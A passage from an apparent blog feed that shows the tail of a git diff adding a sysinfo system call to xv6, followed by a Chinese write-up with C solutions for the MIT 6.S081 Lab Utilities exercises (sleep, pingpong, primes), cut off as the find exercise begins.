prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">// here</span><span class="token prefix inserted">+</span><span class="token line">uint64 proc_num(void) &#123;</span><span class="token prefix inserted">+</span><span class="token line">struct proc *p;</span><span class="token prefix inserted">+</span><span class="token line">uint64 num = 0;</span><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">for(p = proc; p &lt; &amp;proc[NPROC]; ++p) &#123;</span><span class="token prefix inserted">+</span><span class="token line">num += (p->state != UNUSED);</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">return num;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span>\ No newline at end of filediff --git a/kernel/syscall.c b/kernel/syscall.cindex b5b8291..6fed4f2 100644<span class="token coord">--- a/kernel/syscall.c</span><span class="token coord">+++ b/kernel/syscall.c</span>@@ -105,6 +105,7 @@ extern uint64 sys_wait(void);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_write(void);</span><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_uptime(void);</span><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_trace(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">extern uint64 sys_sysinfo(void);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">static uint64 (*syscalls[])(void) = &#123;</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_fork]    sys_fork,</span></span>@@ -129,6 +130,7 @@ static uint64 (*syscalls[])(void) = &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">[SYS_mkdir]   sys_mkdir,</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_close]   sys_close,</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_trace]   sys_trace,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">[SYS_sysinfo] sys_sysinfo,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// here</span></span>@@ -137,7 +139,7 @@ static char *syscall_names[] = &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">"read",   "kill",  "exec",  "fstat", "chdir",</span><span class="token prefix unchanged"> </span><span class="token line">"dup",    "getpid","sbrk",  "sleep", "uptime",</span><span class="token prefix unchanged"> </span><span class="token line">"open",   "write", "mknod", "unlink", "link",</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">"mkdir",  "close", "trace",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">"mkdir",  "close", "trace", "sysinfo",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">void</span></span>diff --git a/kernel/syscall.h b/kernel/syscall.hindex 756d191..7954d98 100644<span class="token coord">--- a/kernel/syscall.h</span><span class="token coord">+++ b/kernel/syscall.h</span><span class="token coord">@@ -20,4 +20,5 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define SYS_link   19</span><span class="token prefix unchanged"> </span><span class="token line">#define SYS_mkdir  20</span><span class="token prefix unchanged"> </span><span class="token line">#define SYS_close  21</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">#define SYS_trace  22 // here</span></span>\ No newline at end of file<span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define SYS_trace  22 // here</span><span class="token prefix inserted">+</span><span class="token line">#define SYS_sysinfo 23</span></span>\ No newline at end of filediff --git a/kernel/sysproc.c b/kernel/sysproc.cindex 3ff51d9..644638f 100644<span class="token coord">--- a/kernel/sysproc.c</span><span class="token coord">+++ b/kernel/sysproc.c</span><span class="token coord">@@ -6,6 +6,7 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#include "memlayout.h"</span><span class="token prefix unchanged"> </span><span class="token line">#include "spinlock.h"</span><span class="token prefix unchanged"> </span><span class="token line">#include "proc.h"</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#include "sysinfo.h"</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">uint64</span><span class="token prefix unchanged"> </span><span class="token line">sys_exit(void)</span></span>@@ -101,5 +102,26 @@ uint64 sys_trace(void) &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">if (argint(0, &amp;(myproc()->mask)) &lt; 0) &#123;</span><span class="token prefix unchanged"> </span><span class="token line">return -1;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">return 0;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">uint64 sys_sysinfo(void) &#123;</span><span class="token prefix inserted">+</span><span class="token line">struct proc *p = myproc();</span><span class="token prefix inserted">+</span><span class="token line">struct sysinfo info;</span><span class="token prefix inserted">+</span><span class="token line">uint64 addr;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">info.freemem = freemem_bytes();</span><span class="token prefix inserted">+</span><span class="token line">info.nproc = proc_num();</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">// get argument addr</span><span class="token prefix inserted">+</span><span class="token line">if (argaddr(0, &amp;addr) &lt; 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">return -1;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">// copy data of info to addr</span><span class="token prefix inserted">+</span><span class="token line">if (copyout(p->pagetable, addr, (char *)&amp;info, sizeof(info)) &lt; 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">return -1;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">return 0;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>\ No newline at end of filediff --git a/user/user.h b/user/user.hindex 16107d6..37d15a5 100644<span class="token coord">--- a/user/user.h</span><span class="token coord">+++ b/user/user.h</span><span class="token coord">@@ -1,5 +1,6 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">struct stat;</span><span class="token prefix unchanged"> </span><span class="token line">struct rtcdate;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">struct sysinfo; // here</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// system calls</span><span class="token prefix unchanged"> </span><span class="token line">int fork(void);</span></span>@@ -24,6 +25,7 @@ char* sbrk(int);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">int sleep(int);</span><span class="token prefix unchanged"> </span><span class="token line">int uptime(void);</span><span class="token prefix unchanged"> </span><span class="token line">int trace(int); // here</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">int sysinfo(struct sysinfo *);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// ulib.c</span><span class="token prefix unchanged"> </span><span class="token line">int stat(const char*, struct stat*);</span></span>diff --git a/user/usys.pl b/user/usys.plindex 76c64ec..fde7c87 100755<span class="token coord">--- a/user/usys.pl</span><span class="token coord">+++ b/user/usys.pl</span>@@ -36,4 +36,5 @@ entry("getpid");<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">entry("sbrk");</span><span class="token prefix unchanged"> </span><span class="token line">entry("sleep");</span><span class="token prefix unchanged"> </span><span class="token line">entry("uptime");</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">entry("trace"); # here</span></span>\ No newline at end of file<span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">entry("trace"); # here</span><span class="token prefix inserted">+</span><span class="token line">entry("sysinfo")</span></span>\ No newline at end of file</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;xv6系统调用实现&quot;&gt;&lt;a href=&quot;#xv6系统调用实现&quot; class=&quot;headerlink&quot; title=&quot;xv6系统调用实现&quot;&gt;&lt;/a&gt;xv6系统调用实现&lt;/h1&gt;&lt;p&gt;不同于 Lab1 利用已实现的系统调用来实现一些用户态下的命令行程序，本 Lab 是</summary>
      
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="xv6" scheme="http://lordaeronesz.github.io/tags/xv6/"/>
    
  </entry>
  
  <entry>
    <title>MIT6.s081 2021 Lab Utilities</title>
    <link href="http://lordaeronesz.github.io/2024/06/24/MIT6.s081-2021-Lab%20Utilities/"/>
    <id>http://lordaeronesz.github.io/2024/06/24/MIT6.s081-2021-Lab%20Utilities/</id>
    <published>2024-06-24T12:45:11.000Z</published>
    <updated>2024-06-26T02:10:33.161Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Boot-xv6"><a href="#Boot-xv6" class="headerlink" title="Boot xv6"></a>Boot xv6</h1><p>按照示例切换到 <code>util</code> 分支后，看到目录下包含 <code>Makefile</code> 文件，执行 <code>make qemu</code> 即可。</p><h1 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>借助系统调用 <code>sleep</code> 实现一个命令行程序，关键是要找到封装了系统调用的 C 函数的位置，根据提示：</p><blockquote><p>… <code>user/user.h</code> for the C definition of <code>sleep</code> callable from a user program …</p></blockquote><p>可知该函数的声明位于 <code>user.h</code> 头文件中，声明方式很简单：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>将其“拷贝”（include）到需要编写的代码 <code>user/sleep.c</code> 中，调用 <code>sleep(&lt;睡眠时间&gt;)</code> 即可。</p><p>最后，按照提示，将编写的 <code>sleep</code> 代码添加到 Makefile 的 <code>UPROGS</code> 中，添加后如下所示：</p><pre class="language-makefile" data-language="makefile"><code class="language-makefile">UPROGS<span class="token operator">=</span>\    <span class="token variable">$U/_cat\</span>    <span class="token variable">$U/_echo\</span>    <span class="token variable">$U/_forktest\</span>    <span class="token variable">$U/_grep\</span>    <span class="token variable">$U/_init\</span>    <span class="token variable">$U/_kill\</span>    <span class="token variable">$U/_ln\</span>    <span class="token variable">$U/_ls\</span>    <span class="token variable">$U/_mkdir\</span>    <span class="token variable">$U/_rm\</span>    <span class="token variable">$U/_sh\</span>    <span class="token variable">$U/_stressfs\</span>    <span class="token variable">$U/_usertests\</span>    <span class="token variable">$U/_grind\</span>    <span class="token variable">$U/_wc\</span>    <span class="token variable">$U/_zombie\</span>    <span class="token variable">$U/_sleep\</span></code></pre><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">// user/sleep.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/types.h"</span> <span class="token comment">// 注意先包含types.h</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"user/user.h"</span>    <span class="token comment">// 再包含user.h（user.h中存在在types.h中定义的别名）</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"sleep: argument count error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> time <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sleep</span><span class="token punctuation">(</span>time<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="pingpong"><a href="#pingpong" class="headerlink" title="pingpong"></a>pingpong</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>本题主要是要理解管道的接口设计，以及借助该接口实现父进程与子进程之间的通信。这是 <code>xv6</code> 文档中对于 <code>pipe</code> 调用的描述：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">pipe</span><span class="token punctuation">(</span><span class="token keyword">int</span> p<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">// Create a pipe, put read/write file descriptors in p[0] and p[1].</span></code></pre><p><code>pipe</code> 创建一个管道，并分别将该管道的读、写端文件描述符置为 <code>p[0]</code> 和 <code>p[1]</code>，之后调用 <code>fork</code> 创建一个子进程，由于 <code>fork</code> 的作用是将父进程的数据直接拷贝给子进程，因此子进程同时继承了父进程的管道文件描述符，可以借助该文件描述符进行进程间通信（IPC），相当于借助一个共享文件进行通信，只不过该“文件”存储在内存的内核区域中，而不占用实际的磁盘存储空间。</p><p>利用管道解决本题的基本流程如下，首先需要创建两个管道 pa 和 pb，然后：</p><ol><li>父进程向管道 pa 的写端写入 1 字节数据，然后关闭 pa 的写端。</li><li>子进程从管道 pa 的读端读取 1 字节数据，然后关闭 pa 的读端，打印信息，然后向管道 pb 的写端写入 1 字节数据，关闭 pb 的写端。</li><li>父进程从管道 pb 的读端读取 1 字节数据，关闭 pb 的读端，最后打印信息。</li></ol><p>这里需要解释一下为什么需要两个管道（只是<strong>个人的方法</strong>，其它方法可能只需要一个管道），由于进程调度策略的影响，父进程和子进程的执行顺序并不确定。可能出现这样一种情况：在 <code>fork</code> 创建子进程后，父进程先被调度，将 1 字节数据写入管道，这时理想的情况是子进程被调度，然后读取父进程发送的数据，但是事实可能并不会如我们所愿，子进程可能一直得不到调度，父进程继续向下执行，从管道中读取自己刚刚发送的 1 字节的数据，这样子进程就无法收到父进程发送的数据，父子进程之间的通信也就失败了。</p><p>通过创建两个管道，并分别关闭对应的读端和写端，就能够得到两个单向数据流的管道，也就不会有上述自己写入的数据被被自己读取的情况出现。</p><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">// user/pingpong.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/types.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"user/user.h"</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> pa<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> pb<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">pipe</span><span class="token punctuation">(</span>pa<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">pipe</span><span class="token punctuation">(</span>pb<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">close</span><span class="token punctuation">(</span>pa<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>pb<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// phase_2</span><span class="token function">read</span><span class="token punctuation">(</span>pa<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>pa<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d: received ping\n"</span><span class="token punctuation">,</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span>pb<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>pb<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">close</span><span class="token punctuation">(</span>pa<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>pb<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// phase_1</span><span class="token function">write</span><span class="token punctuation">(</span>pa<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>pa<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// phase_3</span><span class="token function">read</span><span class="token punctuation">(</span>pb<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>pb<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d: received pong\n"</span><span class="token punctuation">,</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"pingpong: fork failed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="primes"><a href="#primes" class="headerlink" title="primes"></a>primes</h1><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>实现一个基于管道的并发埃式筛（The sieve of Eratosthenes），关键是要理解管道的机制，以及仔细阅读题干给出的<a href="https://swtch.com/~rsc/thread/">文章</a>，该文章有关该埃式筛方法的介绍图片如下所示：</p><p><img src="/2024/06/24/MIT6.s081-2021-Lab%20Utilities/primes.png"></p><p>该算法的个人感觉十分精妙，以下是基本流程：</p><ol><li>进程 0（主进程）发出一系列从 2 开始的整数序列。</li><li>进程 1 首先接收来自进程 0 发出的第一个整数 prime，prime 一定是一个质数，将其打印出来。然后继续按顺序接收来自进程 0 发出的其它整数，若接收到的某个整数能够被 prime 整除，则丢弃它（不做处理），否则将该整数发送给下一个进程。</li><li>后续进程的操作与进程 1 类似，直到没有任何整数发送给下一个进程，程序终止。</li></ol><p>算法的思路并不复杂，主要问题在于如何使用管道实现上述流程中进程 i 与进程 i + 1 之间的通信。我这里只使用了一个 <code>int[2]</code> 来轮换地存放管道的文件描述符，并使用一个缓冲区来暂存每次要发送给下一个进程的数，在一个进程完成它所做的工作后，再将缓冲区中的数据批量写入管道，并创建子进程来完成接下来的工作。这里要千万注意管道完成读取或写入后及时关闭，否则可能会出现子进程读取管道时阻塞的情况。</p><p>我在写下这篇博客的过程中发现，虽然我使用的这个方法能够达到预期的效果，并成功通过测试用例，但是其实是有一定问题的：本方法的处理过程是串行的。事实上，每个进程都是在将本进程的所有工作全部完成之后，再调用 <code>fork</code> 来创建子进程，完成后续的工作，本质上与放在一个进程中完成所有工作并没有区别，与文章中提到的 “<em>Concurrent</em>” 完全相悖。理想的做法应该是创建一个 <code>int[2]</code> 数组来存放管道的文件描述符，并及时 <code>fork</code> 子进程来工作，以此来实现并发，具体的代码实现有待后续改进。</p><h2 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">// user/primes.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/types.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"user/user.h"</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> p<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">pipe</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> buf<span class="token punctuation">;</span><span class="token keyword">int</span> plist<span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">35</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">write</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>i<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">close</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> prime <span class="token operator">=</span> buf<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"prime %d\n"</span><span class="token punctuation">,</span> prime<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> pcnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>buf <span class="token operator">%</span> prime<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>plist<span class="token punctuation">[</span>pcnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> buf<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">close</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">pipe</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// rotating pipe</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> pcnt<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">write</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>plist <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">close</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">wait</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"primes: fork error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="find"><a href="#find" class="headerlink" title="find"></a>find</h1><h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><p>本题是这个 Lab 中我花费时间最长的，代码思路虽然不算很复杂，但是有很多的细节问题我在写的时候没有考虑到，感觉 debug 时间差不多是 coding 的几倍了。。。</p><p>题目要求实现一个简易的 <code>find</code> 命令，根据提示可以参考 <code>user/ls.c</code> 